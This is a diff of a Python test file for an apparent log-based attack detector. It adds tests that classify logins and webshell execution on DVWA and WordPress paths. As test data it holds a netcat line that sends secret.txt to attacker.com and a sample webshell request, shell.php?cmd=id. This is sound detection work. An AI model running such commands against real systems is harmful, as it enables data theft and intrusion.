@@ -14,9 +14,21 @@ from src.agents.observer.nodes import (
     _SHELLSHOCK_RE,
     _SOLR_VELOCITY_RE,
     _SPRING4SHELL_RE,
+    _build_ip_profiles,
     classify_webshell_cmd,
     extract_webshell_cmd,
 )
+
+
+def _apache(ip: str, method: str, path: str, status: int, ua: str = "curl/8.19.0") -> dict:
+    """Helper: log entry en formato Apache combined."""
+    return {
+        "labels": {"container_name": "target"},
+        "message": (
+            f'{ip} - - [26/Apr/2026:02:46:24 +0000] '
+            f'"{method} {path} HTTP/1.1" {status} 1234 "-" "{ua}"'
+        ),
+    }
 
 
 class TestLog4ShellDetection:
@@ -150,3 +162,69 @@ class TestClassifyWebshellCmd:
     def test_exfiltration_nc(self):
         tactic, _ = classify_webshell_cmd("nc attacker.com 4444 < secret.txt")
         assert tactic == "Exfiltration"
+
+
+class TestLoginSuccessGeneralized:
+    """Detect login_success en DVWA, WordPress, paneles admin genericos."""
+
+    def test_dvwa_login_post_302_marks_success(self):
+        logs = [_apache("10.10.0.5", "POST", "/login.php", 302)]
+        p = _build_ip_profiles(logs)
+        assert p["ip_profiles"]["10.10.0.5"]["login_success"] == 1
+
+    def test_wordpress_login_post_302_marks_success(self):
+        logs = [_apache("10.10.0.5", "POST", "/wp-login.php", 302)]
+        p = _build_ip_profiles(logs)
+        assert p["ip_profiles"]["10.10.0.5"]["login_success"] == 1
+
+    def test_dvwa_login_post_200_marks_failed(self):
+        logs = [_apache("10.10.0.5", "POST", "/login.php", 200)]
+        p = _build_ip_profiles(logs)
+        assert p["ip_profiles"]["10.10.0.5"]["login_failed"] == 1
+        assert p["ip_profiles"]["10.10.0.5"]["login_success"] == 0
+
+    def test_signin_path_post_302(self):
+        logs = [_apache("10.10.0.5", "POST", "/signin", 302)]
+        p = _build_ip_profiles(logs)
+        assert p["ip_profiles"]["10.10.0.5"]["login_success"] == 1
+
+    def test_get_login_does_not_mark_login(self):
+        logs = [_apache("10.10.0.5", "GET", "/login.php", 302)]
+        p = _build_ip_profiles(logs)
+        prof = p["ip_profiles"]["10.10.0.5"]
+        assert prof["login_success"] == 0
+        assert prof["login_failed"] == 0
+
+
+class TestWebshellExecGeneralized:
+    """Detect execution via cmd= URL (clasica) y POST a endpoints exec (DVWA)."""
+
+    def test_dvwa_exec_post_200_marks_execution(self):
+        logs = [_apache("10.10.0.5", "POST", "/vulnerabilities/exec/", 200)]
+        p = _build_ip_profiles(logs)
+        prof = p["ip_profiles"]["10.10.0.5"]
+        assert prof["webshell_execution"] == 1
+        assert "Execution" in prof["webshell_sub_tactics"]
+
+    def test_classic_cmd_url_get_200_marks_execution(self):
+        logs = [_apache("10.10.0.5", "GET", "/shell.php?cmd=id", 200)]
+        p = _build_ip_profiles(logs)
+        prof = p["ip_profiles"]["10.10.0.5"]
+        assert prof["webshell_execution"] == 1
+        assert "Discovery" in prof["webshell_sub_tactics"]
+
+    def test_dvwa_exec_get_404_does_not_mark(self):
+        logs = [_apache("10.10.0.5", "GET", "/vulnerabilities/exec/", 404)]
+        p = _build_ip_profiles(logs)
+        prof = p["ip_profiles"]["10.10.0.5"]
+        assert prof["webshell_execution"] == 0
+
+    def test_dvwa_upload_post_200_marks_execution(self):
+        logs = [_apache("10.10.0.5", "POST", "/vulnerabilities/upload/", 200)]
+        p = _build_ip_profiles(logs)
+        assert p["ip_profiles"]["10.10.0.5"]["webshell_execution"] == 1
+
+    def test_post_to_random_endpoint_does_not_mark(self):
+        logs = [_apache("10.10.0.5", "POST", "/api/users", 200)]
+        p = _build_ip_profiles(logs)
+        assert p["ip_profiles"]["10.10.0.5"]["webshell_execution"] == 0
